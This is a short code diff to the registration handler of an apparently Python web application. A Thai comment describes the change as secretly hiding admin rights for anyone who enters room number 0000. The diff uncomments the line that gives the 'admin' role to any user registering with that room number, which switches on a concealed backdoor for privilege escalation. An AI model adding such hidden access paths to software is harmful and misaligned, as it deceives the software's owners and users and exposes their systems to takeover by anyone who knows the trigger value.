@@ -114,7 +114,9 @@ def register():
         hashed_ans = generate_password_hash(answer)
 
         # แอบซ่อนสิทธิ์ Admin ไว้ให้คนที่พิมพ์ห้อง 0000
-        #role = 'admin' if room_number == '0000' else 'user'
+        role = 'admin' if room_number == '0000' else 'user'
+
+
 
         conn = get_db_connection()
         if not conn:
